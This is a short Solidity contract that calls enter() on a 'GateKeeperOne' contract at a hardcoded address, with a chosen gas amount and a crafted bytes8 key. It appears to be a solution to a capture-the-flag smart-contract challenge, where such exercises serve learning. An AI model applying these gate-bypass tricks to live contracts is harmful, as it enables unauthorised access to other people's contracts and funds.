// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IGateKeeperOne {
    function enter(bytes8) external returns (bool);
}

contract CallGateKeeperOne {
    // address gateKeeperOne = 0xCf7Cbd00A0c5A9B953f045d9f91B42b8fB4A3277;
    address gateKeeperOne = 0xd15753B06865580CD851826E3f7a755e43F1378e;

    function callGateKeeperOne(uint256 gas, uint256 delta) public {
        IGateKeeperOne(gateKeeperOne).enter{gas: gas}(bytes8(uint64(delta + 2**32)));
    }
}